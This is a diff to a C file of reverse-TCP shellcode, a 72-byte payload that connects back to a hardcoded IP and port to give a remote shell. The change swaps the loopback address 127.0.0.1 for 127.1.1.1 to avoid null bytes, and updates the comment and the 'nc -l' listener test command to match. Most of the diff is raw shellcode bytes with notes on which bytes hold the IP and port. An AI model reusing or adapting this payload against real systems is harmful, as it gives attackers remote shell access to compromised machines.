@@ -39,7 +39,7 @@
  shell_reverse_tcp_shellcode
 
  * 72 bytes
- * null-bytes free if the address is
+ * null-bytes free if the port and address are
  * the ip address and port number are easily changeable (2nd to 5th bytes are the IP) and (9th and 10th are the Port)
  
 
@@ -47,7 +47,7 @@
  # ./shellcode
 
  Testing
- # nc -l 127.0.0.1 55555
+ # nc -l 127.1.1.1 55555
  # ./shellcode 
 
 */
@@ -58,7 +58,7 @@
 unsigned char code[] = \
 
 "\x68"
-"\x7f\x00\x00\x01"  // <- IP Number "127.0.0.1"
+"\x7f\x01\x01\x01"  // <- IP Number "127.1.1.1"
 "\x5e\x66\x68"
 "\xd9\x03"          // <- Port Number "55555"
 "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
